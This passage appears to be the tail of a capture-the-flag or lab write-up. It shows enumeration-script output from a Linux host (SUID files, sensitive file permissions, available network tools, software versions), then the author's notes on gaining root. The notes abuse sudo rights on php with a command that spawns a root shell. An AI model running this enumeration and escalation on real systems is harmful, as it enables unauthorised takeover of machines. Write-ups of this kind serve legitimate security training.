-rwxr-xr-x 1 root root 92 Aug 21  2019 hdparm

/lib/systemd/catalog:
total 160K
-rw-r--r-- 1 root root  13K Jan  6  2021 systemd.be.catalog
-rw-r--r-- 1 root root 9.8K Jan  6  2021 systemd.be@latin.catalog
-rw-r--r-- 1 root root  14K Jan  6  2021 systemd.bg.catalog
-rw-r--r-- 1 root root  15K Jan  6  2021 systemd.catalog
-rw-r--r-- 1 root root  471 Jan  6  2021 systemd.de.catalog
-rw-r--r-- 1 root root  13K Jan  6  2021 systemd.fr.catalog
-rw-r--r-- 1 root root  16K Jan  6  2021 systemd.it.catalog
-rw-r--r-- 1 root root  15K Jan  6  2021 systemd.pl.catalog
-rw-r--r-- 1 root root 8.1K Jan  6  2021 systemd.pt_BR.catalog
-rw-r--r-- 1 root root  20K Jan  6  2021 systemd.ru.catalog
-rw-r--r-- 1 root root 7.1K Jan  6  2021 systemd.zh_CN.catalog
-rw-r--r-- 1 root root 7.1K Jan  6  2021 systemd.zh_TW.catalog

/lib/systemd/network:
total 32K
-rw-r--r-- 1 root root  44 Jan  6  2021 73-usb-net-by-mac.link
-rw-r--r-- 1 root root 645 Apr  1  2020 80-container-host0.network
-rw-r--r-- 1 root root 718 Apr  1  2020 80-container-ve.network
-rw-r--r-- 1 root root 704 Apr  1  2020 80-container-vz.network
-rw-r--r-- 1 root root  78 Apr  1  2020 80-wifi-adhoc.network
-rw-r--r-- 1 root root 101 Apr  1  2020 80-wifi-ap.network.example
-rw-r--r-- 1 root root  64 Apr  1  2020 80-wifi-station.network.example
-rw-r--r-- 1 root root 491 Apr  1  2020 99-default.link

/lib/systemd/ntp-units.d:
total 4.0K
-rw-r--r-- 1 root root 26 Apr  1  2020 80-systemd-timesync.list

/lib/systemd/system-environment-generators:
total 24K
-rwxr-xr-x 1 root root 23K Nov 19  2020 snapd-env-generator

/lib/systemd/system-preset:
total 8.0K
-rw-r--r-- 1 root root   30 Jun 18  2020 fwupd-refresh.preset
-rw-r--r-- 1 root root 1.5K Apr  1  2020 90-systemd.preset

/lib/systemd/system-shutdown:
total 8.0K
-rwxr-xr-x 1 root root 160 Sep 28  2020 mdadm.shutdown
-rwxr-xr-x 1 root root 168 Jun 18  2020 fwupd.shutdown

/lib/systemd/user:
total 136K
drwxr-xr-x 2 root root 4.0K Feb  1  2021 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 graphical-session-pre.target.wants
-rw-r--r-- 1 root root  546 Jan  6  2021 graphical-session-pre.target
-rw-r--r-- 1 root root  141 Nov 19  2020 snapd.session-agent.service
-rw-r--r-- 1 root root  152 Nov 19  2020 snapd.session-agent.socket
-rw-r--r-- 1 root root  165 Sep 23  2020 pk-debconf-helper.service
-rw-r--r-- 1 root root  127 Sep 23  2020 pk-debconf-helper.socket
-rw-r--r-- 1 root root  147 Jun 23  2020 glib-pacrunner.service
-rw-r--r-- 1 root root  360 Jun 11  2020 dbus.service
-rw-r--r-- 1 root root  174 Jun 11  2020 dbus.socket
-rw-r--r-- 1 root root  287 May 29  2020 ssh-agent.service
-rw-r--r-- 1 root root  497 Apr  1  2020 basic.target
-rw-r--r-- 1 root root  419 Apr  1  2020 bluetooth.target
-rw-r--r-- 1 root root  463 Apr  1  2020 default.target
-rw-r--r-- 1 root root  502 Apr  1  2020 exit.target
-rw-r--r-- 1 root root  484 Apr  1  2020 graphical-session.target
-rw-r--r-- 1 root root  394 Apr  1  2020 paths.target
-rw-r--r-- 1 root root  417 Apr  1  2020 printer.target
-rw-r--r-- 1 root root  442 Apr  1  2020 shutdown.target
-rw-r--r-- 1 root root  420 Apr  1  2020 smartcard.target
-rw-r--r-- 1 root root  396 Apr  1  2020 sockets.target
-rw-r--r-- 1 root root  420 Apr  1  2020 sound.target
-rw-r--r-- 1 root root  500 Apr  1  2020 systemd-exit.service
-rw-r--r-- 1 root root  657 Apr  1  2020 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  533 Apr  1  2020 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  720 Apr  1  2020 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  445 Apr  1  2020 timers.target
-rw-r--r-- 1 root root  231 Mar 10  2020 dirmngr.service
-rw-r--r-- 1 root root  204 Aug 28  2017 dirmngr.socket
-rw-r--r-- 1 root root  298 Aug 28  2017 gpg-agent-browser.socket
-rw-r--r-- 1 root root  281 Aug 28  2017 gpg-agent-extra.socket
-rw-r--r-- 1 root root  308 Aug 28  2017 gpg-agent-ssh.socket
-rw-r--r-- 1 root root  223 Aug 28  2017 gpg-agent.service
-rw-r--r-- 1 root root  234 Aug 28  2017 gpg-agent.socket

/lib/systemd/user/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Nov 19  2020 snapd.session-agent.socket -> ../snapd.session-agent.socket
lrwxrwxrwx 1 root root 14 Jun 11  2020 dbus.socket -> ../dbus.socket

/lib/systemd/user/graphical-session-pre.target.wants:
total 0
lrwxrwxrwx 1 root root 20 May 29  2020 ssh-agent.service -> ../ssh-agent.service

/lib/systemd/user-environment-generators:
total 20K
-rwxr-xr-x 1 root root 15K Jan  6  2021 30-systemd-environment-d-generator
-rw-r--r-- 1 root root 851 Mar 10  2020 90gpg-agent

/lib/systemd/user-generators:
total 0

/lib/systemd/user-preset:
total 4.0K
-rw-r--r-- 1 root root 744 Apr  1  2020 90-systemd.preset


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.31


[-] MYSQL version:
mysql  Ver 8.0.23-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))


[-] Apache version:
Server version: Apache/2.4.41 (Ubuntu)
Server built:   2020-08-12T19:46:17


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 rewrite_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/usr/bin/nc
/usr/bin/netcat
/usr/bin/wget
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1813 Feb  9  2021 /etc/passwd
-rw-r--r-- 1 root root 826 Feb 16  2021 /etc/group
-rw-r--r-- 1 root root 581 Dec  5  2019 /etc/profile
-rw-r----- 1 root shadow 1051 Feb  9  2021 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 110792 Feb  2  2021 /snap/snapd/11036/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 111048 Mar 26  2021 /snap/snapd/11588/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/1997/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1997/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1997/bin/su
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/1997/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1997/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1997/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1997/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1997/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1997/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/1997/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1997/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/1988/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1988/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1988/bin/su
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/1988/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1988/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1988/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1988/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1988/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1988/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/1988/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1988/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1988/usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 130152 Nov 19  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 53040 May 28  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x 1 root root 85064 May 28  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 88464 May 28  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 44784 May 28  2020 /usr/bin/newgrp


[-] SGID files:
-rwxr-sr-x 1 root shadow 34816 Jul 21  2020 /snap/core18/1997/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Jul 21  2020 /snap/core18/1997/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /snap/core18/1997/usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /snap/core18/1997/usr/bin/expiry
-rwxr-sr-x 1 root crontab 362640 Mar  4  2019 /snap/core18/1997/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 30800 Sep 16  2020 /snap/core18/1997/usr/bin/wall
-rwxr-sr-x 1 root shadow 34816 Jul 21  2020 /snap/core18/1988/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Jul 21  2020 /snap/core18/1988/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /snap/core18/1988/usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /snap/core18/1988/usr/bin/expiry
-rwxr-sr-x 1 root crontab 362640 Mar  4  2019 /snap/core18/1988/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 30800 Sep 16  2020 /snap/core18/1988/usr/bin/wall
-rwxr-sr-x 1 root utmp 14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 43168 Jul 21  2020 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43160 Jul 21  2020 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root ssh 350504 May 29  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 84512 May 28  2020 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31312 May 28  2020 /usr/bin/expiry
-rwxr-sr-x 1 root tty 35048 Jul 21  2020 /usr/bin/wall
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwxr-sr-x 1 root tty 14488 Mar 30  2020 /usr/bin/bsd-write


[+] Files with POSIX capabilities set:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 642 Sep 24  2019 /etc/xattr.conf
-rw-r--r-- 1 root root 5060 Aug 21  2019 /etc/hdparm.conf
-rw-r--r-- 1 root root 510 Feb  1  2021 /etc/nsswitch.conf
-rw-r--r-- 1 root root 533 Jan 21  2019 /etc/logrotate.conf
-rw-r--r-- 1 root root 1382 Feb 11  2020 /etc/rsyslog.conf
-rw-r--r-- 1 root root 552 Dec 17  2019 /etc/pam.conf
-rw-r--r-- 1 root root 1260 Dec 14  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 350 Feb  1  2021 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 604 Sep 15  2018 /etc/deluser.conf
-rw-r--r-- 1 root root 2351 Feb 13  2020 /etc/sysctl.conf
-rw-r--r-- 1 root root 34 Apr 14  2020 /etc/ld.so.conf
-rw-r--r-- 1 root root 2969 Aug  3  2019 /etc/debconf.conf
-rw-r--r-- 1 root root 6920 Feb 25  2020 /etc/overlayroot.conf
-rw-r--r-- 1 root root 14867 Feb  1  2019 /etc/ltrace.conf
-rw-r--r-- 1 root root 685 Feb 14  2020 /etc/e2scrub.conf
-rw-r--r-- 1 root root 2584 Feb  1  2020 /etc/gai.conf
-rw-r--r-- 1 root root 808 Feb 14  2020 /etc/mke2fs.conf
-rw-r--r-- 1 root root 6569 Feb  9  2021 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 3028 Feb  1  2021 /etc/adduser.conf
-rw-r--r-- 1 root root 41 Apr  6  2020 /etc/multipath.conf
-rw-r--r-- 1 root root 92 Dec  5  2019 /etc/host.conf
-rw-r--r-- 1 root root 191 Feb 18  2020 /etc/libaudit.conf


[-] Location and contents (if accessible) of .bash_history file(s):
/home/mrb3n/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw-r--r-- 1 www-data www-data 225 Oct 30 17:07 /var/www/html/backups/other/website.xml.bak
-rw-r--r-- 1 www-data www-data 995 Oct 30 17:07 /var/www/html/backups/other/components.xml.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Mar 12  2024 .
drwxr-xr-x 14 root root 4096 Mar 12  2024 ..


### SCAN COMPLETE ####################################

root under /usr/bin/php but we knew this with sudo -l

doing some google-fu (nice term i found) showed use that we cna use php commands to get root

CMD="/bin/sh"
sudo php -r "system('$CMD');"

boom we're root, checked with whoami





</details>
